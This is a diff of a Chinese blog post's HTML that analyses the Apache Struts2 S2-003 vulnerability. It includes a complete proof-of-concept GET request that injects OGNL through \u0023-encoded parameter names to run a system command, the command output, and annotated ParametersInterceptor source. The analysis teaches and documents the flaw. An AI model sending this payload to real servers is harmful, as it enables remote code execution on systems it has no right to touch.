@@ -3,21 +3,21 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
-  <title>Struts2框架: S2-003漏洞详细分析 - Dean&#39;s notes</title>
-  <meta property="og:title" content="Struts2框架: S2-003漏洞详细分析 - Dean&#39;s notes" />
-  <meta name="twitter:title" content="Struts2框架: S2-003漏洞详细分析 - Dean&#39;s notes" />
+  <title>Struts2框架: S2-003 漏洞详细分析 - 老路的博客</title>
+  <meta property="og:title" content="Struts2框架: S2-003 漏洞详细分析 - 老路的博客" />
+  <meta name="twitter:title" content="Struts2框架: S2-003 漏洞详细分析 - 老路的博客" />
   <meta name="description" content="0x00 前言 阅读本文需要具备的知识：
- 熟悉J2EE开发, 了解Struts2框架执行流程  0x01 漏洞复现 影响漏洞版本:">
+ 熟悉J2EE开发 了解Struts2框架执行流程  如果你不具备这些知识, 阅读这篇文章将会是一场艰难的旅行.">
   <meta property="og:description" content="0x00 前言 阅读本文需要具备的知识：
- 熟悉J2EE开发, 了解Struts2框架执行流程  0x01 漏洞复现 影响漏洞版本:">
+ 熟悉J2EE开发 了解Struts2框架执行流程  如果你不具备这些知识, 阅读这篇文章将会是一场艰难的旅行.">
   <meta name="twitter:description" content="0x00 前言 阅读本文需要具备的知识：
- 熟悉J2EE开发, 了解Struts2框架执行流程  0x01 漏洞复现 影响漏洞版本:">
+ 熟悉J2EE开发 了解Struts2框架执行流程  如果你不具备这些知识, 阅读这篇文章将会是一场艰难的旅行.">
   <meta name="author" content="Dean"/>
-  <meta property="og:site_name" content="Dean&#39;s notes" />
+  <meta property="og:site_name" content="老路的博客" />
   <meta property="og:url" content="https://dean2021.github.io/posts/s2-003/" />
   <meta property="og:type" content="article" />
   <meta name="twitter:card" content="summary" />
-  <meta name="generator" content="Hugo 0.52" />
+  <meta name="generator" content="Hugo 0.55.6" />
 
   <link rel="stylesheet" href="/css/style.css" media="all" />
   <link rel="stylesheet" href="/css/syntax.css" media="all" />
@@ -32,7 +32,7 @@
 
 <header class="site-header">
   <nav class="site-navi">
-    <h1 class="site-title"><a href="/">Dean&#39;s notes</a></h1>
+    <h1 class="site-title"><a href="/">老路的博客</a></h1>
     <ul class="site-navi-items">
       <li class="site-navi-item-home"><a href="/" title="Home">Home</a></li>
       <li class="site-navi-item-categories"><a href="/categories/" title="Categories">Categories</a></li>
@@ -52,27 +52,27 @@
     <article class="article">
       
       
-      <h1 class="article-title">Struts2框架: S2-003漏洞详细分析</h1>
+      <h1 class="article-title">Struts2框架: S2-003 漏洞详细分析</h1>
       
       <hr class="article-title-bottom">
       <ul class="article-meta">
-        <li class="article-meta-date"><time>December 24, 2018</time></li>
+        <li class="article-meta-date"><time>December 19, 2018</time></li>
         <li class="article-meta-categories">
           <a href="/categories/java/">
             <i class="fas fa-folder"></i>
             java
           </a>&nbsp;
         </li>
-        <li class="article-meta-categories">
-          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
-            <i class="fas fa-folder"></i>
-            漏洞分析
+        <li class="article-meta-tags">
+          <a href="/tags/struts2/">
+            <i class="fas fa-tag"></i>
+            struts2
           </a>&nbsp;
         </li>
         <li class="article-meta-tags">
-          <a href="/tags/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE/">
+          <a href="/tags/rce/">
             <i class="fas fa-tag"></i>
-            经典漏洞回顾
+            rce
           </a>&nbsp;
         </li>
       </ul>
@@ -85,9 +85,11 @@
 <p>阅读本文需要具备的知识：</p>
 
 <ol>
-<li>熟悉J2EE开发,</li>
+<li>熟悉J2EE开发</li>
 <li>了解Struts2框架执行流程</li>
 </ol>
+
+<p>如果你不具备这些知识, 阅读这篇文章将会是一场艰难的旅行.</p>
 
 <h3 id="0x01-漏洞复现">0x01 漏洞复现</h3>
 
@@ -103,7 +105,7 @@
 <p><a href="https://github.com/dean2021/java_security_book/tree/master/Struts2/s2_003">https://github.com/dean2021/java_security_book/tree/master/Struts2/s2_003</a></p>
 </blockquote>
 
-<p>测试POC:</p>
+<p>公布的POC:</p>
 
 <pre><code>GET /s2_war/index.action?(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(bla)(bla)&amp;(%27\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET%27)(kxlzx)(kxlzx)&amp;(%27\u0023mycmd\u003d\%27id\%27%27)(bla)(bla)&amp;(%27\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)%27)(bla)(bla)&amp;(A)((%27\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())%27)(bla))&amp;(B)((%27\u0023myres\u003dnew\40byte[51020]%27)(bla))&amp;(C)((%27\u0023mydat.readFully(\u0023myres)%27)(bla))&amp;(D)((%27\u0023mystr\u003dnew\40java.lang.String(\u0023myres)%27)(bla))&amp;(%27\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()%27)(bla)(bla)&amp;(E)((%27\u0023myout.getWriter().println(\u0023mystr)%27)(bla)) HTTP/1.1
 Host: 127.0.0.1:8080
@@ -113,566 +115,290 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/a
 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,pt;q=0.7,da;q=0.6
 Cookie: JSESSIONID=FC7DC2221FDB37EAE855C6E6A11E9CC1; _ga=GA1.1.267931382.1545202285
 Connection: close
-
 </code></pre>
 
 <p>请求响应内容:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-html" data-lang="html"><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-html" data-lang="html">HTTP/1.1 200 OK
+
+<pre><code>HTTP/1.1 200 OK
 Server: Apache-Coyote/1.1
 Date: Mon, 24 Dec 2018 09:36:01 GMT
 Connection: close
 
-uid=1234556(xxxx) gid=1603212982 groups=1603212982....</code></pre></td></tr></table>
-</div>
-</div>
-<h3 id="0x02-漏洞原理">0x02 漏洞原理</h3>
+uid=1234556(xxxx) gid=1603212982 groups=1603212982....
+</code></pre>
+
+<h3 id="0x02-漏洞分析">0x02 漏洞分析</h3>
 
 <p>问题出现在ParameterInterceptors.java(参数拦截器)， 我们看一下代码:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span><span class="lnt">108
-</span><span class="lnt">109
-</span><span class="lnt">110
-</span><span class="lnt">111
-</span><span class="lnt">112
-</span><span class="lnt">113
-</span><span class="lnt">114
-</span><span class="lnt">115
-</span><span class="lnt">116
-</span><span class="lnt">117
-</span><span class="lnt">118
-</span><span class="lnt">119
-</span><span class="lnt">120
-</span><span class="lnt">121
-</span><span class="lnt">122
-</span><span class="lnt">123
-</span><span class="lnt">124
-</span><span class="lnt">125
-</span><span class="lnt">126
-</span><span class="lnt">127
-</span><span class="lnt">128
-</span><span class="lnt">129
-</span><span class="lnt">130
-</span><span class="lnt">131
-</span><span class="lnt">132
-</span><span class="lnt">133
-</span><span class="lnt">134
-</span><span class="lnt">135
-</span><span class="lnt">136
-</span><span class="lnt">137
-</span><span class="lnt">138
-</span><span class="lnt">139
-</span><span class="lnt">140
-</span><span class="lnt">141
-</span><span class="lnt">142
-</span><span class="lnt">143
-</span><span class="lnt">144
-</span><span class="lnt">145
-</span><span class="lnt">146
-</span><span class="lnt">147
-</span><span class="lnt">148
-</span><span class="lnt">149
-</span><span class="lnt">150
-</span><span class="lnt">151
-</span><span class="lnt">152
-</span><span class="lnt">153
-</span><span class="lnt">154
-</span><span class="lnt">155
-</span><span class="lnt">156
-</span><span class="lnt">157
-</span><span class="lnt">158
-</span><span class="lnt">159
-</span><span class="lnt">160
-</span><span class="lnt">161
-</span><span class="lnt">162
-</span><span class="lnt">163
-</span><span class="lnt">164
-</span><span class="lnt">165
-</span><span class="lnt">166
-</span><span class="lnt">167
-</span><span class="lnt">168
-</span><span class="lnt">169
-</span><span class="lnt">170
-</span><span class="lnt">171
-</span><span class="lnt">172
-</span><span class="lnt">173
-</span><span class="lnt">174
-</span><span class="lnt">175
-</span><span class="lnt">176
-</span><span class="lnt">177
-</span><span class="lnt">178
-</span><span class="lnt">179
-</span><span class="lnt">180
-</span><span class="lnt">181
-</span><span class="lnt">182
-</span><span class="lnt">183
-</span><span class="lnt">184
-</span><span class="lnt">185
-</span><span class="lnt">186
-</span><span class="lnt">187
-</span><span class="lnt">188
-</span><span class="lnt">189
-</span><span class="lnt">190
-</span><span class="lnt">191
-</span><span class="lnt">192
-</span><span class="lnt">193
-</span><span class="lnt">194
-</span><span class="lnt">195
-</span><span class="lnt">196
-</span><span class="lnt">197
-</span><span class="lnt">198
-</span><span class="lnt">199
-</span><span class="lnt">200
-</span><span class="lnt">201
-</span><span class="lnt">202
-</span><span class="lnt">203
-</span><span class="lnt">204
-</span><span class="lnt">205
-</span><span class="lnt">206
-</span><span class="lnt">207
-</span><span class="lnt">208
-</span><span class="lnt">209
-</span><span class="lnt">210
-</span><span class="lnt">211
-</span><span class="lnt">212
-</span><span class="lnt">213
-</span><span class="lnt">214
-</span><span class="lnt">215
-</span><span class="lnt">216
-</span><span class="lnt">217
-</span><span class="lnt">218
-</span><span class="lnt">219
-</span><span class="lnt">220
-</span><span class="lnt">221
-</span><span class="lnt">222
-</span><span class="lnt">223
-</span><span class="lnt">224
-</span><span class="lnt">225
-</span><span class="lnt">226
-</span><span class="lnt">227
-</span><span class="lnt">228
-</span><span class="lnt">229
-</span><span class="lnt">230
-</span><span class="lnt">231
-</span><span class="lnt">232
-</span><span class="lnt">233
-</span><span class="lnt">234
-</span><span class="lnt">235
-</span><span class="lnt">236
-</span><span class="lnt">237
-</span><span class="lnt">238
-</span><span class="lnt">239
-</span><span class="lnt">240
-</span><span class="lnt">241
-</span><span class="lnt">242
-</span><span class="lnt">243
-</span><span class="lnt">244
-</span><span class="lnt">245
-</span><span class="lnt">246
-</span><span class="lnt">247
-</span><span class="lnt">248
-</span><span class="lnt">249
-</span><span class="lnt">250
-</span><span class="lnt">251
-</span><span class="lnt">252
-</span><span class="lnt">253
-</span><span class="lnt">254
-</span><span class="lnt">255
-</span><span class="lnt">256
-</span><span class="lnt">257
-</span><span class="lnt">258
-</span><span class="lnt">259
-</span><span class="lnt">260
-</span><span class="lnt">261
-</span><span class="lnt">262
-</span><span class="lnt">263
-</span><span class="lnt">264
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ParametersInterceptor</span> <span class="kd">extends</span> <span class="n">MethodFilterInterceptor</span> <span class="o">{</span>
 
-    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">Log</span> <span class="n">LOG</span> <span class="o">=</span> <span class="n">LogFactory</span><span class="o">.</span><span class="na">getLog</span><span class="o">(</span><span class="n">ParametersInterceptor</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+<pre><code>public class ParametersInterceptor extends MethodFilterInterceptor {
 
-    <span class="kt">boolean</span> <span class="n">ordered</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
-    <span class="n">Set</span><span class="o">&lt;</span><span class="n">Pattern</span><span class="o">&gt;</span> <span class="n">excludeParams</span> <span class="o">=</span> <span class="n">Collections</span><span class="o">.</span><span class="na">EMPTY_SET</span><span class="o">;</span>
-    <span class="n">Set</span><span class="o">&lt;</span><span class="n">Pattern</span><span class="o">&gt;</span> <span class="n">acceptedParams</span> <span class="o">=</span> <span class="n">Collections</span><span class="o">.</span><span class="na">EMPTY_SET</span><span class="o">;</span>
+    private static final Log LOG = LogFactory.getLog(ParametersInterceptor.class);
+
+    boolean ordered = false;
+    Set&lt;Pattern&gt; excludeParams = Collections.EMPTY_SET;
+    Set&lt;Pattern&gt; acceptedParams = Collections.EMPTY_SET;
 
 
-    <span class="c1">// 正则判断参数名是否包含这些特殊字符
-</span><span class="c1"></span>    <span class="kd">private</span> <span class="n">String</span> <span class="n">acceptedParamNames</span> <span class="o">=</span> <span class="s">&#34;[\\p{Graph}&amp;&amp;[^,#:=]]*&#34;</span><span class="o">;</span>
-    <span class="kd">private</span> <span class="n">Pattern</span> <span class="n">acceptedPattern</span> <span class="o">=</span> <span class="n">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="n">acceptedParamNames</span><span class="o">);</span>
+    // 正则判断参数名是否包含这些特殊字符
+    private String acceptedParamNames = &quot;[\\p{Graph}&amp;&amp;[^,#:=]]*&quot;;
+    private Pattern acceptedPattern = Pattern.compile(acceptedParamNames);
 
-    <span class="kd">static</span> <span class="kt">boolean</span> <span class="n">devMode</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+    static boolean devMode = false;
 
-    <span class="nd">@Inject</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">&#34;devMode&#34;</span><span class="o">,</span> <span class="n">required</span> <span class="o">=</span> <span class="kc">false</span><span class="o">)</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setDevMode</span><span class="o">(</span><span class="n">String</span> <span class="n">mode</span><span class="o">)</span> <span class="o">{</span>
-        <span class="n">devMode</span> <span class="o">=</span> <span class="s">&#34;true&#34;</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">mode</span><span class="o">);</span>
-    <span class="o">}</span>
+    @Inject(value = &quot;devMode&quot;, required = false)
+    public static void setDevMode(String mode) {
+        devMode = &quot;true&quot;.equals(mode);
+    }
 
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setAcceptedParamNames</span><span class="o">(</span><span class="n">String</span> <span class="n">commaDelim</span><span class="o">)</span> <span class="o">{</span>
-        <span class="n">Collection</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">acceptPatterns</span> <span class="o">=</span> <span class="n">asCollection</span><span class="o">(</span><span class="n">commaDelim</span><span class="o">);</span>
-        <span class="k">if</span> <span class="o">(</span><span class="n">acceptPatterns</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">acceptedParams</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">&lt;</span><span class="n">Pattern</span><span class="o">&gt;();</span>
-            <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">pattern</span> <span class="o">:</span> <span class="n">acceptPatterns</span><span class="o">)</span> <span class="o">{</span>
-                <span class="n">acceptedParams</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="n">pattern</span><span class="o">));</span>
-            <span class="o">}</span>
-        <span class="o">}</span>
-    <span class="o">}</span>
+    public void setAcceptedParamNames(String commaDelim) {
+        Collection&lt;String&gt; acceptPatterns = asCollection(commaDelim);
+        if (acceptPatterns != null) {
+            acceptedParams = new HashSet&lt;Pattern&gt;();
+            for (String pattern : acceptPatterns) {
+                acceptedParams.add(Pattern.compile(pattern));
+            }
+        }
+    }
 
-    <span class="cm">/**
-</span><span class="cm">     * Compares based on number of &#39;.&#39; characters (fewer is higher)
-</span><span class="cm">     */</span>
-    <span class="kd">static</span> <span class="kd">final</span> <span class="n">Comparator</span> <span class="n">rbCollator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Comparator</span><span class="o">()</span> <span class="o">{</span>
-        <span class="kd">public</span> <span class="kt">int</span> <span class="nf">compare</span><span class="o">(</span><span class="n">Object</span> <span class="n">arg0</span><span class="o">,</span> <span class="n">Object</span> <span class="n">arg1</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">String</span> <span class="n">s1</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">arg0</span><span class="o">;</span>
-            <span class="n">String</span> <span class="n">s2</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">arg1</span><span class="o">;</span>
-            <span class="kt">int</span> <span class="n">l1</span> <span class="o">=</span> <span class="n">0</span><span class="o">,</span> <span class="n">l2</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
-            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">s1</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="n">1</span><span class="o">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span><span class="o">--)</span> <span class="o">{</span>
-                <span class="k">if</span> <span class="o">(</span><span class="n">s1</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">)</span> <span class="o">==</span> <span class="sc">&#39;.&#39;</span><span class="o">)</span> <span class="n">l1</span><span class="o">++;</span>
-            <span class="o">}</span>
-            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">s2</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="n">1</span><span class="o">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span><span class="o">--)</span> <span class="o">{</span>
-                <span class="k">if</span> <span class="o">(</span><span class="n">s2</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">)</span> <span class="o">==</span> <span class="sc">&#39;.&#39;</span><span class="o">)</span> <span class="n">l2</span><span class="o">++;</span>
-            <span class="o">}</span>
-            <span class="k">return</span> <span class="n">l1</span> <span class="o">&lt;</span> <span class="n">l2</span> <span class="o">?</span> <span class="o">-</span><span class="n">1</span> <span class="o">:</span> <span class="o">(</span><span class="n">l2</span> <span class="o">&lt;</span> <span class="n">l1</span> <span class="o">?</span> <span class="n">1</span> <span class="o">:</span> <span class="n">s1</span><span class="o">.</span><span class="na">compareTo</span><span class="o">(</span><span class="n">s2</span><span class="o">));</span>
-        <span class="o">}</span>
+    /**
+     * Compares based on number of '.' characters (fewer is higher)
+     */
+    static final Comparator rbCollator = new Comparator() {
+        public int compare(Object arg0, Object arg1) {
+            String s1 = (String) arg0;
+            String s2 = (String) arg1;
+            int l1 = 0, l2 = 0;
+            for (int i = s1.length() - 1; i &gt;= 0; i--) {
+                if (s1.charAt(i) == '.') l1++;
+            }
+            for (int i = s2.length() - 1; i &gt;= 0; i--) {
+                if (s2.charAt(i) == '.') l2++;
+            }
+            return l1 &lt; l2 ? -1 : (l2 &lt; l1 ? 1 : s1.compareTo(s2));
+        }
 
-        <span class="o">;</span>
-    <span class="o">};</span>
+        ;
+    };
 
 
 
-    <span class="c1">// 拦截器入口方法
-</span><span class="c1"></span>    <span class="kd">public</span> <span class="n">String</span> <span class="nf">doIntercept</span><span class="o">(</span><span class="n">ActionInvocation</span> <span class="n">invocation</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
-        <span class="n">Object</span> <span class="n">action</span> <span class="o">=</span> <span class="n">invocation</span><span class="o">.</span><span class="na">getAction</span><span class="o">();</span>
-        <span class="k">if</span> <span class="o">(!(</span><span class="n">action</span> <span class="k">instanceof</span> <span class="n">NoParameters</span><span class="o">))</span> <span class="o">{</span>
-            <span class="n">ActionContext</span> <span class="n">ac</span> <span class="o">=</span> <span class="n">invocation</span><span class="o">.</span><span class="na">getInvocationContext</span><span class="o">();</span>
+    // 拦截器入口方法
+    public String doIntercept(ActionInvocation invocation) throws Exception {
+        Object action = invocation.getAction();
+        if (!(action instanceof NoParameters)) {
+            ActionContext ac = invocation.getInvocationContext();
 
-            <span class="c1">// 获取所有参数
-</span><span class="c1"></span>            <span class="kd">final</span> <span class="n">Map</span> <span class="n">parameters</span> <span class="o">=</span> <span class="n">ac</span><span class="o">.</span><span class="na">getParameters</span><span class="o">();</span>
+            // 获取所有参数
+            final Map parameters = ac.getParameters();
 
-            <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
-                <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;Setting params &#34;</span> <span class="o">+</span> <span class="n">getParameterLogMap</span><span class="o">(</span><span class="n">parameters</span><span class="o">));</span>
-            <span class="o">}</span>
+            if (LOG.isDebugEnabled()) {
+                LOG.debug(&quot;Setting params &quot; + getParameterLogMap(parameters));
+            }
 
-            <span class="k">if</span> <span class="o">(</span><span class="n">parameters</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
-                <span class="n">Map</span> <span class="n">contextMap</span> <span class="o">=</span> <span class="n">ac</span><span class="o">.</span><span class="na">getContextMap</span><span class="o">();</span>
-                <span class="k">try</span> <span class="o">{</span>
-                    <span class="n">OgnlContextState</span><span class="o">.</span><span class="na">setCreatingNullObjects</span><span class="o">(</span><span class="n">contextMap</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
-                    <span class="n">OgnlContextState</span><span class="o">.</span><span class="na">setDenyMethodExecution</span><span class="o">(</span><span class="n">contextMap</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
-                    <span class="n">OgnlContextState</span><span class="o">.</span><span class="na">setReportingConversionErrors</span><span class="o">(</span><span class="n">contextMap</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+            if (parameters != null) {
+                Map contextMap = ac.getContextMap();
+                try {
+                    OgnlContextState.setCreatingNullObjects(contextMap, true);
+                    OgnlContextState.setDenyMethodExecution(contextMap, true);
+                    OgnlContextState.setReportingConversionErrors(contextMap, true);
 
-                    <span class="n">ValueStack</span> <span class="n">stack</span> <span class="o">=</span> <span class="n">ac</span><span class="o">.</span><span class="na">getValueStack</span><span class="o">();</span>
+                    ValueStack stack = ac.getValueStack();
 
-                    <span class="c1">// 将所有参数存放到OGNL栈中， 我们跟进实现
-</span><span class="c1"></span>                    <span class="n">setParameters</span><span class="o">(</span><span class="n">action</span><span class="o">,</span> <span class="n">stack</span><span class="o">,</span> <span class="n">parameters</span><span class="o">);</span>
+                    // 将所有参数存放到OGNL栈中， 我们跟进实现
+                    setParameters(action, stack, parameters);
 
-                <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
-                    <span class="n">OgnlContextState</span><span class="o">.</span><span class="na">setCreatingNullObjects</span><span class="o">(</span><span class="n">contextMap</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
-                    <span class="n">OgnlContextState</span><span class="o">.</span><span class="na">setDenyMethodExecution</span><span class="o">(</span><span class="n">contextMap</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
-                    <span class="n">OgnlContextState</span><span class="o">.</span><span class="na">setReportingConversionErrors</span><span class="o">(</span><span class="n">contextMap</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
-                <span class="o">}</span>
-            <span class="o">}</span>
-        <span class="o">}</span>
-        <span class="k">return</span> <span class="n">invocation</span><span class="o">.</span><span class="na">invoke</span><span class="o">();</span>
-    <span class="o">}</span>
+                } finally {
+                    OgnlContextState.setCreatingNullObjects(contextMap, false);
+                    OgnlContextState.setDenyMethodExecution(contextMap, false);
+                    OgnlContextState.setReportingConversionErrors(contextMap, false);
+                }
+            }
+        }
+        return invocation.invoke();
+    }
 
-    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">setParameters</span><span class="o">(</span><span class="n">Object</span> <span class="n">action</span><span class="o">,</span> <span class="n">ValueStack</span> <span class="n">stack</span><span class="o">,</span> <span class="kd">final</span> <span class="n">Map</span> <span class="n">parameters</span><span class="o">)</span> <span class="o">{</span>
-        <span class="n">ParameterNameAware</span> <span class="n">parameterNameAware</span> <span class="o">=</span> <span class="o">(</span><span class="n">action</span> <span class="k">instanceof</span> <span class="n">ParameterNameAware</span><span class="o">)</span>
-                <span class="o">?</span> <span class="o">(</span><span class="n">ParameterNameAware</span><span class="o">)</span> <span class="n">action</span> <span class="o">:</span> <span class="kc">null</span><span class="o">;</span>
+    protected void setParameters(Object action, ValueStack stack, final Map parameters) {
+        ParameterNameAware parameterNameAware = (action instanceof ParameterNameAware)
+                ? (ParameterNameAware) action : null;
 
-        <span class="n">Map</span> <span class="n">params</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
-        <span class="k">if</span> <span class="o">(</span><span class="n">ordered</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">params</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TreeMap</span><span class="o">(</span><span class="n">getOrderedComparator</span><span class="o">());</span>
-            <span class="n">params</span><span class="o">.</span><span class="na">putAll</span><span class="o">(</span><span class="n">parameters</span><span class="o">);</span>
-        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
-            <span class="n">params</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TreeMap</span><span class="o">(</span><span class="n">parameters</span><span class="o">);</span>
-        <span class="o">}</span>
+        Map params = null;
+        if (ordered) {
+            params = new TreeMap(getOrderedComparator());
+            params.putAll(parameters);
+        } else {
+            params = new TreeMap(parameters);
+        }
 
-        <span class="k">for</span> <span class="o">(</span><span class="n">Iterator</span> <span class="n">iterator</span> <span class="o">=</span> <span class="n">params</span><span class="o">.</span><span class="na">entrySet</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span> <span class="n">iterator</span><span class="o">.</span><span class="na">hasNext</span><span class="o">();)</span> <span class="o">{</span>
-            <span class="n">Map</span><span class="o">.</span><span class="na">Entry</span> <span class="n">entry</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">)</span> <span class="n">iterator</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
-            <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">entry</span><span class="o">.</span><span class="na">getKey</span><span class="o">().</span><span class="na">toString</span><span class="o">();</span>
-
-
-            <span class="c1">// 这里对参数名进行了特殊字符判断，其中包括#字符
-</span><span class="c1"></span>            <span class="c1">// 由于我们用\u0023替代#绕过正则判断
-</span><span class="c1"></span>            <span class="kt">boolean</span> <span class="n">acceptableName</span> <span class="o">=</span> <span class="n">acceptableName</span><span class="o">(</span><span class="n">name</span><span class="o">)</span>
